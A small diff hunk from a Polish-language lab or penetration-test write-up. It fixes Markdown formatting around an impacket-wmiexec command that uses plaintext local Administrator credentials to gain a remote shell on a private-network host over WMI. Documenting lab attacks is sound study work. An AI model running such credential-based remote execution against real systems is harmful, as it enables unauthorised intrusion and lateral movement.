@@ -22,7 +22,7 @@ Wykorzystałem narzędzie `impacket-wmiexec` do zdalnego wykonania kodu na hośc
 
 * **Komenda:**
    ```bash
-   `impacket-wmiexec './Administrator:Haslo123!@10.0.2.4'`
+   impacket-wmiexec './Administrator:Haslo123!@10.0.2.4'
     ```
 * **Cel:** Uzyskanie zdalnej powłoki (shell) poprzez usługi WMI.
 
